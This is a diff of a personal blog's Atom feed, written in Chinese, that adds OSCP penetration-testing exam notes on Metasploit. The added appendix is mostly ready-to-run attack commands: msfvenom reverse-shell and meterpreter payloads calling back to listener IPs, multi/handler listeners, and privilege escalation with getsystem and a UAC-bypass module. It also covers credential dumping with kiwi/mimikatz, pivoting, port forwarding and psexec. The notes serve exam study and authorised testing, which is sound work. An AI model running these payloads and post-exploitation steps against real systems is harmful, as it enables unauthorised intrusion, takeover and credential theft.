@@ -4,7 +4,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom" xml:lang="zh-CN">
     <title type="text">Klear·blog</title>
     <subtitle type="html">Klear的生活记录&amp;&amp;工作记录。</subtitle>
-    <updated>2023-10-17T11:14:01&#43;08:00</updated>
+    <updated>2023-10-17T11:23:33&#43;08:00</updated>
     <id>https://klearcc.github.io/</id>
     <link rel="alternate" type="text/html" href="https://klearcc.github.io/" />
     <link rel="self" type="application/atom&#43;xml" href="https://klearcc.github.io/atom.xml" />
@@ -17,20 +17,21 @@
     <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights>
     <generator uri="https://gohugo.io/" version="0.103.1">Hugo</generator>
         <entry>
-            <title type="text">针对OSCP考试的命令笔记</title>
+            <title type="text">仅针对OSCP考试的命令笔记</title>
             <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/%E7%BB%84%E4%BB%B6%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/" />
             <id>https://klearcc.github.io/post/%E7%BB%84%E4%BB%B6%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/</id>
-            <updated>2023-10-17T11:07:48&#43;08:00</updated>
+            <updated>2023-10-17T11:23:27&#43;08:00</updated>
             <published>2023-10-17T09:52:48&#43;08:00</published>
             <author>
                     <name>Klear</name>
                     <uri>https://klearcc.github.io/</uri>
                     <email>baicaix86@gmail.com</email>
                     </author>
-            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">此命令笔记只针对OSCP考试，不包括内容……</summary>
+            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">此命令笔记仅针对OSCP考试，不包括内容……</summary>
             
-                <content type="html">&lt;h1 id=&#34;此命令笔记只针对oscp考试不包括内容攻击方式随时更新&#34;&gt;此命令笔记只针对OSCP考试，不包括内容、攻击方式。随时更新&lt;/h1&gt;
+                <content type="html">&lt;h1 id=&#34;此命令笔记仅针对oscp考试不包括内容攻击方式随时更新&#34;&gt;此命令笔记仅针对OSCP考试，不包括内容、攻击方式。随时更新&lt;/h1&gt;
 &lt;h2 id=&#34;httpsgithubcomklearccnotesblobmain组件攻击汇总md&#34;&gt;&lt;a href=&#34;https://github.com/Klearcc/Notes/blob/main/&#34;&gt;https://github.com/Klearcc/Notes/blob/main/&lt;/a&gt;组件攻击汇总.md&lt;/h2&gt;
+&lt;p&gt;笔记较乱，考后有时间会重新整理。&lt;/p&gt;
 &lt;p&gt;详细笔记，如每章概念介绍、各钟攻击方式等，会稍后更新。&lt;/p&gt;
 &lt;h1 id=&#34;toc&#34;&gt;Toc&lt;/h1&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-table-of-contents&#34; data-lang=&#34;table-of-contents&#34;&gt;style: nestedList # TOC style (nestedList|inlineFirstLevel)
@@ -2262,7 +2263,300 @@ tide免杀平台
 &lt;h3 id=&#34;枚举内网&#34;&gt;枚举内网&lt;/h3&gt;
 &lt;h3 id=&#34;攻击内网&#34;&gt;攻击内网&lt;/h3&gt;
 &lt;h3 id=&#34;获取域控权限&#34;&gt;获取域控权限&lt;/h3&gt;
-</content>
+&lt;h2 id=&#34;附-msf&#34;&gt;附 msf&lt;/h2&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;## msfvenom
+set ExitOnSession false      可不断接受新会话
+
+### hta attack
+
+```bash
+	msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp  LHOST=10.10.10.9 LPORT=1234 -f hta-psh -o ./hta
+```
+
+### powershell
+
+```bash
+	msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=10.10.10.9 LPORT=1234 -e cmd/powershell_base64 -i 3 -f raw -o powershell.ps1
+```
+
+### shell_reverse
+
+```shell
+## exe
+	msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f exe &amp;gt; binary.exe
+
+## powershell 
+	msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.45.152 LPORT=1234 -f powershell -v sc
+
+
+## shellcode
+	msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp  LHOST=192.168.45.152 LPORT=1234  --platform win  -f c 
+	msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.45.185 LPORT=1234  -f c 
+
+## php
+	msfvenom  -p php/meterpreter_reverse_tcp lhost=192.168.45.203  lport=1234 -o php
+
+
+
+
+## listen
+	msfconsole -x &amp;#34;use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 0.0.0.0;set LPORT 1234;run;&amp;#34;
+
+```
+### 常用回连payloads
+```
+linux/x64/shell/reverse_tcp               staged
+linux/x64/shell_reverse_tcp
+
+windows/x64/meterpreter_reverse_tcp       non-staged 
+windows/x64/meterpreter/reverse_tcp  
+linux/x64/meterpreter_reverse_https
+linux/x64/meterpreter/reverse_https
+
+```
+
+
+
+
+
+-----------------
+
+
+## msfconsole
+
+###
+
+```bash
+### 指定多个Rhosts
+	set rhosts file:./ip
+### 多个端口
+	set lport 1234,2345
+### listen
+	msfconsole -x &amp;#34;use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 172.20.10.3; set LPORT 1234;run;&amp;#34;
+```
+
+### auxiliay模块
+
+```bash
+## 搜索
+	search type:auxiliary smb
+### socks 默认启到1080
+	use auxiliary/server/socks_proxy
+
+### 端口扫描
+	use auxiliary/scanner/portscan/tcp
+
+### 端口转发
+	meterpreter&amp;gt; portfwd add -l 3389 -p 3389 -r 172.16.5.200
+```
+
+### exploit常用模块
+
+```bash
+	use auxiliary/scanner/portscan/tcp 
+
+	post/windows/manage/migrate 
+
+	
+	exploit/windows/local/bypassuac_sdclt
+
+	exploit/windows/smb/psexec
+```
+
+
+
+#  Msf Fundamentals
+
+```bash
+## 初始化数据库
+	msfdb init 
+## 验证数据库连接
+	db_status
+	
+## 三个层级
+	workspace：最大
+	job：      exploit 在bg
+	session：  打下来的shell
+	### 工作区
+	    workspace 
+	    workspace -a 123
+	### job
+	    run -j 
+	    jobs
+	### 会话
+	    ctrl+Z
+	    sessions 
+	        -l 		显示会话
+	    sessions 
+	        -i xx	选择会话
+	        -k xx	kill
+	### channel
+		-l 
+		-i
+	
+	
+## 搜索模块
+	search type:auxiliary smb
+	show missing 
+	
+## nmap
+	db_nmap
+## 探测到的漏洞
+	vulns
+## 爆破出的凭据
+	creds
+## 发现的资产
+	hosts
+	services
+	services -p 8000
+	
+## 设置rhosts为所有发现的445资产
+	services -p 445 --rhosts
+```
+
+
+
+## exploit
+
+### shell: staged and non-staged    - 分阶段和不分阶段
+
+shell/reverse_tcp	 staged
+shell_reverse_tcp 	non-staged
+
+staged用得比较多shell/reverse_tcp，第一部分比较小，主要是让vic回连；第二部分比较大，目的为执行exp
+
+non-staged稳定性比较高，但是体积比其他类型的更大。
+
+### meterpreter: staged and non-staged
+
+完全在内存中
+
+同样有分阶段和不分阶段两种，正常使用不分阶段的
+meterpreter_reverse_tcp
+meterpreter_reverse_https
+
+```bash
+## meterpreter
+	sysinfo 
+	getuid 
+	search -f fileName
+	getenv xx
+	
+	help 
+	exit
+	shell ### 交互式shell
+		Ctrl+Z 
+		channel -l
+		channel -i 2
+		exit
+
+## 上传文件
+	upload chisel.exe C:\\Users\\marcus\\chisel.exe
+	upload /usr/bin/unix-privesc-check /tmp/
+## 下载文件
+	lpwd  
+	lcd /home/kali/Downloads   更改本地目录
+	download /etc/passwd
+	lcat /home/kali/Downloads/passwd 看文件内容
+```
+
+
+
+### meterpreter后渗透功能
+
+```bash
+## 系统空闲时间 当前是否正在使用中
+idletime
+
+## 尝试所有方法提权至NT AUTHORITY\SYSTEM
+	### Server username
+		getuid
+	###使用SeImpersonatePrivilege和SeDebugPrivilege提权
+		getsystem
+
+## 进程迁移 只能迁移到与当前进程相同（或更低）完整性和特权级别的进程中
+可选 use post/windows/manage/migrate
+	ps
+	migrate 8052   		##迁移到存在的pid为8052的进程
+或
+	execute -H -f notepad   	##启动一个隐藏的notepad进程
+	migrate pidxx				##直接迁移到进程
+
+
+## 是管理员组权限的话可以绕过UAC。UAC的作用是虽然是管理员，但是也不能执行命令 
+	### 值为High时，算绕过UAC
+		powershell -ep bypass
+		Import-Module NtObjectManager
+		Get-NtTokenIntegrityLevel
+	### 模块绕过
+		use exploit/windows/local/bypassuac_sdclt
+		
+	system权限可以在meterpreter中load kiwi（其中包含mimikatz）
+		### 获取LM NTLM凭证
+		creds_msv
+	
+--
+## pivoting路由  另外使用这些添加的路由需要用bind meterpreter
+	bg
+	## 添加路由到session
+	route add 1.1.1.1/24 sessionId
+	route print
+	## autoroute
+	use multi/manage/autoroute
+	## 删除路由
+	route flush
+	## 开socks
+	use auxiliary/server/socks_proxy
+		set SRVHOST 127.0.0.1
+		proxychains: 127.0.0.1 port
+	## meterpreter内端口转发
+	meterpreter&amp;gt; portfwd -h
+		portfwd add -l 3389 -p 3389 -r 172.16.5.200
+		sudo xfreerdp /v:127.0.0.1 /u:luiza
+
+## psexec exploit 需要目标是管理员权限，并且使用添加的路由需要使用meterpreter bind类型的payload
+	use exploit/windows/smb/psexec
+	set payload windows/x64/meterpreter/bind_tcp
+
+
+
+```
+
+#### 端口转发
+
+```bash
+## 端口转发
+meterpreter&amp;gt; portfwd add -l 3389 -p 3389 -r 172.16.5.200
+
+```
+
+
+## resource scripts
+
+##开启监听 进程迁移
+```bash
+## 其中的migrate模块：
+	自动启动一个后台的notepad.exe进程并迁移到它
+## 使用：  
+	sudo msfconsole -r listener.rc
+## 自带脚本：
+	ls -l /usr/share/metasploit-framework/scripts/resource
+## 全局设置：
+	setg
+	unsetg
+```
+
+```bash 
+use exploit/multi/handler
+set payload windows/meterpreter_reverse_https 
+set lhost 0.0.0.0
+set lport 443 
+set autorunscript post/windows/manage/migrate
+set exitonsession false
+run -z -j
+
+```
+&lt;/code&gt;&lt;/pre&gt;</content>
             
             
             
